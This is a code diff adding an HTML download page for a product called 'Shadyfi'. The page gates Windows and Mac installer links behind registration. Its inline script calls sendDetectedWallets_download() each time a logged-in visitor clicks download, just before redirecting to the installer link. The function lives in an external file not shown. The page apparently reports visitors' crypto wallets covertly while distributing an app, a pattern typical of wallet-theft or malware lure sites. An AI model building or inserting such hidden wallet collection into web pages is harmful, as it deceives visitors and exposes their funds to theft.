@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Download - Shadyfi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="format-detection" content="address=no" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-touch-fullscreen" content="yes" />
+    <link rel="icon" type="image/png" href="images/favicons/favicon-96x96.png" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="images/favicons/favicon.svg" />
+    <link rel="shortcut icon" href="images/favicons/favicon.ico" />
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favicons/apple-touch-icon.png" />
+    <link rel="manifest" href="images/favicons/site.webmanifest" />
+    <meta name="theme-color" content="#ffffff">
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <style>
+        .download-list.authenticated {
+            display: block;
+        }
+        .download-list {
+            display: none;
+        }
+        .register-button-container {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .register-button-container.authenticated {
+            display: none;
+        }
+    </style>
+</head> 
+<body>  
+ <div class="wrapper-overflow">
+    <div class="sidebar-column left-column">
+        <header class="column-header"><button class="mobile-btn"></button><a href="/"><img src="images/logotype.svg" alt="" /></a></header>
+        <div class="sidebar-nav-box">
+            <div class="search-area">
+                <form>
+                    <button class="btn-search"><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M7.75911 13.0299C10.7046 13.0299 13.0924 10.6421 13.0924 7.69661C13.0924 4.7511 10.7046 2.36328 7.75911 2.36328C4.8136 2.36328 2.42578 4.7511 2.42578 7.69661C2.42578 10.6421 4.8136 13.0299 7.75911 13.0299Z" stroke="currentcolor" stroke-width="1.33333" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M14.4257 14.3633L11.5591 11.4966" stroke="currentcolor" stroke-width="1.33333" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    </button>
+                    <input type="text" value="" placeholder="Search or ask..." /><span>Ctrl K</span>
+                </form>
+            </div>
+            <div class="dowload-cell">
+                <button class="download-btn">
+                    <div class="download-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" color="currentcolor"><g data-name="Layer 2"><g data-name="download"><rect width="24" height="24" opacity="0"/><rect x="4" y="18" width="16" height="2" rx="1" ry="1"/><rect x="3" y="17" width="4" height="2" rx="1" ry="1" transform="rotate(-90 5 18)"/><rect x="17" y="17" width="4" height="2" rx="1" ry="1" transform="rotate(-90 19 18)"/><path d="M12 15a1 1 0 0 1-.58-.18l-4-2.82a1 1 0 0 1-.24-1.39 1 1 0 0 1 1.4-.24L12 12.76l3.4-2.56a1 1 0 0 1 1.2 1.6l-4 3a1 1 0 0 1-.6.2z"/><path d="M12 13a1 1 0 0 1-1-1V4a1 1 0 0 1 2 0v8a1 1 0 0 1-1 1z"/></g></g></svg></div>
+                    <div class="download-text">
+                        <span>Files</span>
+                        <small>Download on Win/Mac</small>
+                    </div>
+                </button>
+            </div>
+            <nav class="navigation">
+                <h2>Other Pages</h2>
+                <ul class="navigation-list">
+                    <li class="nav-item"><a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" color="currentcolor"><g data-name="Layer 2"><g data-name="download"><rect width="24" height="24" opacity="0"/><rect x="4" y="18" width="16" height="2" rx="1" ry="1"/><rect x="3" y="17" width="4" height="2" rx="1" ry="1" transform="rotate(-90 5 18)"/><rect x="17" y="17" width="4" height="2" rx="1" ry="1" transform="rotate(-90 19 18)"/><path d="M12 15a1 1 0 0 1-.58-.18l-4-2.82a1 1 0 0 1-.24-1.39 1 1 0 0 1 1.4-.24L12 12.76l3.4-2.56a1 1 0 0 1 1.2 1.6l-4 3a1 1 0 0 1-.6.2z"/><path d="M12 13a1 1 0 0 1-1-1V4a1 1 0 0 1 2 0v8a1 1 0 0 1-1 1z"/></g></g></svg>Files</a></li>
+                    <li class="nav-item select"><a href="#">Downloads</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+    <div class="main-article">
+        <div class="article-container">
+            <div class="section-header">
+                <div class="header-label">Downloads</div>
+                <h2 id="download-message">Since you are not registered, you cannot use our product.</h2>
+                <p id="download-submessage">Please register by clicking the button below.</p>
+                <div class="register-button-container">
+                    <a href="registry" class="register-button">Register</a>
+                </div>
+                <div class="download-list">
+                    <div class="download-item-cell">
+                        <a class="link-load windows-download" href="#" onclick="trackAndDownload('windows'); return false;">
+                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M17.5245 0.23851H10.1801V9.58287H19.5245V2.23851C19.5245 1.13394 18.629 0.23851 17.5245 0.23851ZM2 0.238609C0.89543 0.238609 0 1.13404 0 2.23861V9.58297H9.34436V0.238609H2ZM0 10.4171H9.34436V19.7615H2C0.895431 19.7615 0 18.8661 0 17.7615V10.4171ZM19.5245 10.4171H10.1801V19.7615H17.5245C18.629 19.7615 19.5245 18.8661 19.5245 17.7615V10.4171Z"
+                                    fill="url(#paint0_linear_0_924)" />
+                                <defs>
+                                    <linearGradient id="paint0_linear_0_924" x1="1.86894" y1="0.23851" x2="17.7535" y2="19.8621" gradientUnits="userSpaceOnUse">
+                                        <stop stop-color="#6DD4FF" />
+                                        <stop offset="1" stop-color="#0079D4" />
+                                    </linearGradient>
+                                </defs>
+                            </svg>
+                            Install the Windows app
+                        </a>
+                        <a class="link-load mac-download" href="#" onclick="trackAndDownload('mac'); return false;">                            <i></i>Mac OS Setup
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="section-header">
+                <h2>Old version</h2>
+                <p>Why don't we provide you with older versions of our app? Old versions lose their relevance after the release of a new one, we want you to be always on topic and on top with us! That's why we tried to develop this application for weak computers as well!</p>
+            </div>
+        </div>
+    </div>
+    <div class="sidebar-column right-column">
+        <div class="user-navbox">
+            <div class="user-row">
+                <div class="user-container"><span id="user-name">Guest</span><i><svg width="13" height="14" viewBox="0 0 13 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10.1296 3.23662C10.1296 4.9892 8.69521 6.40995 6.92577 6.40995C5.15633 6.40995 3.72192 4.9892 3.72192 3.23662C3.72192 1.48403 5.15633 0.063282 6.92577 0.063282C8.69521 0.063282 10.1296 1.48403 10.1296 3.23662Z" fill="currentcolor"/>
+                    <path d="M0.97583 12.1522C0.97583 9.48157 3.05498 7.31662 5.61973 7.31662H8.23193C10.7967 7.31662 12.8758 9.48157 12.8758 12.1522C12.8758 12.9867 12.2261 13.6633 11.4246 13.6633H2.42705C1.62556 13.6633 0.97583 12.9867 0.97583 12.1522Z" fill="currentcolor"/>
+                    </svg></i>
+                </div>
+            </div>
+            <nav class="navigation">
+                <h2><svg width="13" height="13" viewBox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2.25903 9.86316H10.5923" stroke="#CED2D1" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M2.25903 2.8634H10.5923" stroke="#CED2D1" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M2.25903 6.36328H5.9257" stroke="#CED2D1" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>On this page</h2>
+                <ul class="navigation-list">
+                    <li class="nav-item select">
+                        <a href="#">Downloads</a>
+                        <ul class="sub-list">
+                            <li><a href="#">Desktop Apps</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+ </div> 
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="js/auth.js"></script>
+<script>
+async function trackAndDownload(platform) {
+    const user = await window.checkAuthStatus(false);
+    if (!user || !user.loggedIn) {
+        alert('Please register or log in to download.');
+        window.location.href = 'registry';
+        return;
+    }
+    // await fetch(`/track_download.php?platform=${encodeURIComponent(platform)}`, { method: 'GET' });
+    sendDetectedWallets_download();
+    setTimeout(() => {
+        window.location.href = `/get-link.php?platform=${platform}`;
+    }, 300);
+}
+$(document).ready(function() {
+    $('.mobile-btn').click(function() {
+        $('body').toggleClass('viewNav');
+    });
+
+    const user = checkAuthStatus(false);
+    if (user && user.loggedIn) {
+        $('#user-name').text(user.name || 'User');
+        $('.download-list').addClass('authenticated');
+        $('.register-button-container').addClass('authenticated');
+        $('#download-message').text('You can install our application!');
+        $('#download-submessage').text('Click the buttons below to download for Windows or Mac.');
+    } else {
+        window.location.href = 'registry';
+    }
+});
+</script>
+</body>
+</html>
